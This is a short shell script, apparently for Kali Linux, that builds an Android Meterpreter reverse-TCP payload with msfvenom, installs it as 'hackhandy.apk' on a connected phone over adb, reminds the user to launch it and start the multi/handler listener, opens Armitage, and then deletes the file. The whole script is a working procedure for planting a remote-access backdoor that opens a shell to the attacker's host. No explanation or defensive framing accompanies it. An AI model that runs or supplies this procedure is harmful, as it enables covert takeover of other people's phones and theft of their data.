adb devices
msfvenom -p android/meterpreter/reverse_tcp lhost="your ip"  lport="port" R >/root/hackhandy.apk # remove clasps
adb install /root/hackhandy.apk
echo Open MainActivity
echo multi/handler
echo android/meterpreter/reverse_tcp
service postgresql start
armitage
rm -r /root/hackhandy.apk
echo Success


